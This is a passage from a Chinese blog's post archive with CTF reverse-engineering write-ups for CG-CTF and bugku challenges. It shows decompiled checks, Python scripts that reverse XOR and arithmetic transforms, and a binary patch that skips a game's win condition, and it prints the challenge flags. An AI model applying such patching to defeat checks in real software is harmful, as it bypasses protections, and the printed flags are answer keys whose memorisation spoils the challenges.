class="line"><span class="hljs-attribute">nctf</span>{o<span class="hljs-number">0</span>oo<span class="hljs-number">00</span>O<span class="hljs-number">000</span>oooo..OO}</span><br></pre></td></tr></tbody></table></figure><h4 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h4><p>拖进IDA反编译，发现函数非常大，操作特别多，但是仔细看发现最后要验证的都是byte类型，所有对dword的操作都是无效的，所以把所有操作拷贝到文件(export_results.txt)中，先进行过滤操作，过滤出需要的操作,最后的验证过程如下：</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">24</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(&amp;byte_694100 + i) != dword_694060[i] )</span><br><span class="line">      v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v4 )</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"correct"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"wrong"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br></pre></td></tr></tbody></table></figure><p>所以操作之后的数组和dword_694060数组的每个数的最后一位相同，将数组导出，进行逆运算得到原来输入的flag，python代码如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'export_results.txt'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    s = <span class="hljs-string">''</span></span><br><span class="line">    a = f.readline()</span><br><span class="line">    <span class="hljs-keyword">while</span> a:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">r'(.*)byte_6941(.*);'</span>, a):</span><br><span class="line">            s += a</span><br><span class="line">        a = f.readline()</span><br><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'s.txt'</span>, <span class="hljs-string">'w+'</span>) <span class="hljs-keyword">as</span> ff:</span><br><span class="line">        s = s.split(<span class="hljs-string">'\n'</span>)</span><br><span class="line">        n = <span class="hljs-built_in">len</span>(s)</span><br><span class="line">        <span class="hljs-comment"># print(len(s))</span></span><br><span class="line">        <span class="hljs-comment"># print(s)</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):</span><br><span class="line">            ff.write(s[n - <span class="hljs-number">1</span> - i].strip() + <span class="hljs-string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">ss = [<span class="hljs-number">0xC0</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x37</span>,</span><br><span class="line">      <span class="hljs-number">0xfff</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0xa5</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'s.txt'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    a = f.readline()</span><br><span class="line">    <span class="hljs-keyword">while</span> a:</span><br><span class="line">        <span class="hljs-comment"># print(re.match(r'(.*)byte_6941(.*);', a).groups())</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.match(<span class="hljs-string">r'(.*)byte_6941(.*);'</span>, a).group(<span class="hljs-number">1</span>).strip():</span><br><span class="line">            s = re.match(<span class="hljs-string">r'(.*)byte_6941(.*);'</span>, a).group(<span class="hljs-number">2</span>).split(<span class="hljs-string">' '</span>)</span><br><span class="line">            <span class="hljs-comment"># print(s)</span></span><br><span class="line">            i = <span class="hljs-built_in">int</span>(s[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)</span><br><span class="line">            <span class="hljs-comment"># print(i)</span></span><br><span class="line">            i1 = <span class="hljs-built_in">str</span>(ss[i])</span><br><span class="line">            <span class="hljs-keyword">if</span> s[<span class="hljs-number">1</span>] == <span class="hljs-string">'+='</span>:</span><br><span class="line">                sub = <span class="hljs-string">'-'</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> s[<span class="hljs-number">1</span>] == <span class="hljs-string">'-='</span>:</span><br><span class="line">                sub = <span class="hljs-string">'+'</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                sub = <span class="hljs-string">'^'</span></span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">r'(.*)u'</span>, s[<span class="hljs-number">2</span>]):</span><br><span class="line">                s2 = re.match(<span class="hljs-string">r'(.*)u'</span>, s[<span class="hljs-number">2</span>]).group(<span class="hljs-number">1</span>)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                s2 = s[<span class="hljs-number">2</span>]</span><br><span class="line">            exp = i1 + sub + s2</span><br><span class="line">            ss[i] = <span class="hljs-built_in">eval</span>(exp) % <span class="hljs-number">128</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            s = re.match(<span class="hljs-string">r'(.*)byte_6941(.*);'</span>, a).group(<span class="hljs-number">2</span>).split(<span class="hljs-string">' '</span>)</span><br><span class="line">            <span class="hljs-comment"># print(s)</span></span><br><span class="line">            i = <span class="hljs-built_in">int</span>(s[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)</span><br><span class="line">            <span class="hljs-comment"># print(i)</span></span><br><span class="line">            i1 = <span class="hljs-built_in">str</span>(ss[i])</span><br><span class="line">            <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">r'(.*)byte_6941(.*);'</span>, a).group(<span class="hljs-number">1</span>).strip() == <span class="hljs-string">'++'</span>:</span><br><span class="line">                sub = <span class="hljs-string">'-'</span></span><br><span class="line">            <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">r'(.*)byte_6941(.*);'</span>, a).group(<span class="hljs-number">1</span>).strip() == <span class="hljs-string">'--'</span>:</span><br><span class="line">                sub = <span class="hljs-string">'+'</span></span><br><span class="line">            exp = i1 + sub + <span class="hljs-string">'1'</span></span><br><span class="line">            ss[i] = <span class="hljs-built_in">eval</span>(exp) % <span class="hljs-number">128</span></span><br><span class="line">        a = f.readline()</span><br><span class="line">    <span class="hljs-comment"># print(ss)</span></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">chr</span>(i % <span class="hljs-number">128</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ss]))</span><br></pre></td></tr></tbody></table></figure><p>这里要注意一点，python没有++和–操作，所以直接++和–的传唤算不出正确值，在这里卡了一会儿才发现问题。</p><p>运行程序输出flag：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf{th3_vM_w1th0ut_dAta}</span><br></pre></td></tr></tbody></table></figure><h4 id="你大概需要一个优秀的mac"><a href="#你大概需要一个优秀的mac" class="headerlink" title="你大概需要一个优秀的mac"></a>你大概需要一个优秀的mac</h4><p>这是一个macos程序，没法直接打开，所以还是拖进IDA反编译，发现需要输入一个56位的flag，然后经过几个函数处理之后与一个数组进行比较，相同则输入的是正确的flag，所以还是一样进行一个逆运算</p><p>反编译出来的代码如下：</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;v4);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;v4) != <span class="hljs-number">56</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)err);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  __strcpy_chk(input, &amp;v4, <span class="hljs-number">100LL</span>);</span><br><span class="line">  <span class="hljs-built_in">func1</span>((__int64)input);</span><br><span class="line">  <span class="hljs-built_in">xfun1</span>();</span><br><span class="line">  <span class="hljs-built_in">xfun2</span>();</span><br><span class="line">  <span class="hljs-built_in">xfun3</span>();</span><br><span class="line">  <span class="hljs-built_in">xfun4</span>();</span><br><span class="line">  <span class="hljs-built_in">xfun5</span>();</span><br><span class="line">  <span class="hljs-built_in">check</span>();</span><br><span class="line"><span class="hljs-comment">//func1</span></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">57</span>; ++i ) <span class="hljs-comment">//这里应该是56？</span></span><br><span class="line">  {</span><br><span class="line">    *(_BYTE *)(a1 + i) ^= <span class="hljs-number">0xDE</span>u;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-comment">//xfun1</span></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    input[i] ^= <span class="hljs-number">0xAD</span>u;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-comment">//xfun2</span></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    input[i + <span class="hljs-number">10</span>] ^= <span class="hljs-number">0xBE</span>u;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-comment">//xfun3</span></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    input[i + <span class="hljs-number">20</span>] ^= <span class="hljs-number">0xEF</span>u;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-comment">//xfun4</span></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    input[i + <span class="hljs-number">30</span>] ^= <span class="hljs-number">0xAB</span>u;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-comment">//xfun5</span></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    input[i + <span class="hljs-number">40</span>] ^= <span class="hljs-number">0xEF</span>u;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-comment">//check</span></span><br><span class="line">  <span class="hljs-built_in">memcpy</span>(v2, &amp;byte_100000ED0, <span class="hljs-number">0xE0</span>uLL);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">56</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span>)input[i] != v2[i] )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)err);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>所以将byte_100000ED0处的数组导出，进行逆运算，代码如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="hljs-number">0x15</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>,</span><br><span class="line">     <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x2A</span>,</span><br><span class="line">     <span class="hljs-number">0x18</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x4C</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):</span><br><span class="line">    s[i]^=<span class="hljs-number">0xAD</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>):</span><br><span class="line">    s[i]^=<span class="hljs-number">0xBE</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>,<span class="hljs-number">30</span>):</span><br><span class="line">    s[i]^=<span class="hljs-number">0xEF</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">40</span>):</span><br><span class="line">    s[i]^=<span class="hljs-number">0xAB</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>,<span class="hljs-number">56</span>):</span><br><span class="line">    s[i]^=<span class="hljs-number">0xEF</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">56</span>):</span><br><span class="line">    s[i]^=<span class="hljs-number">0xDE</span></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">chr</span>(i%<span class="hljs-number">128</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]))</span><br></pre></td></tr></tbody></table></figure><p>运行程序输出flag：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{I5_th1s_7he_PR1c3_I'M_PAyiNG_f0r_my_pA57_m1stAk35?}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> CG-CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku-re部分题解</title>
      <link href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这里记录一下bugku平台上一些re题的题解</p><span id="more"></span><h4 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h4><p>直接拖进IDA反编译</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpxsK.png" alt="入门逆向-1"></p><p>直接可以看到flag</p><h4 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h4><p>IDA或OD反编译，搜索字符串</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpXxx.png" alt="Easy_vb-1"><br>看到有flag样式的字符串，是MCTF比赛的题，bugku上需要提交flag(xxx)，所以把MCTF改成flag{}</p><h4 id="Easy-Re"><a href="#Easy-Re" class="headerlink" title="Easy_Re"></a>Easy_Re</h4><p>用OD调试，搜索字符串，找到需要我们输入字符串的位置：<br><img src="https://s2.ax1x.com/2020/02/13/1qpLGR.png" alt="Easy_Re-1"><br>发现提示语和%s，找到输入字符串的位置，加断点单步调试<br><img src="https://s2.ax1x.com/2020/02/13/1qpOR1.png" alt="Easy_Re-2"><br>程序会把输入的字符串和flag进行比较，相同则通过，在寄存器中找到正确的flag</p><h4 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h4><p>这题可以有至少三种解法：<br>1、第一种解法<br>直接游戏通关，很简单，依次输入1-8即可<br><img src="https://s2.ax1x.com/2020/02/13/1qpzqO.png" alt="游戏过关-1"><br>2、使用OD修改程序<br>首先查找字符串找到输出flag关键函数<br><img src="https://s2.ax1x.com/2020/02/13/1q9pZD.png" alt="游戏过关-2"><br>找到如图所示函数的起始地址，跳转两次找到关键判断<br><img src="https://s2.ax1x.com/2020/02/13/1q9CIH.png" alt="游戏过关-3"><br>可以看到jnz指令进行了跳转，如果没有跳转，将会执行输出flag的函数，现在修改程序，将跳转过后的指令修改为输出flag指令<br><img src="https://s2.ax1x.com/2020/02/13/1q9iid.png" alt="游戏过关-4"><br>直接运行程序，输入任意数字都可得到flag<br><img src="https://s2.ax1x.com/2020/02/13/1q9FJA.png" alt="游戏过关-5"><br>3、进行解码解出flag<br>可在上图4-2中看到处理flag的部分，将下面的16进制进行解码即可都得到flag</p><h4 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h4><p>下载下来admin.exe，发现打不开，peid检查发现不是PE程序，用文本编辑器打开，发现时图片转base64，转成图片得到二维码扫描得到flag</p><h4 id="love"><a href="#love" class="headerlink" title="love"></a>love</h4><p>IDA打开反编译，找到输出部分<br><img src="https://s2.ax1x.com/2020/02/13/1qpvM6.png" alt="love-1"><br>发现进行了处理之后将两个base64比较，如果相同就输出flag正确，所以只要将Str2进行反变换就得到了正确的flag</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">"e3nifIH9b_C@n@dH"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s[i]) - i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> bugku </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
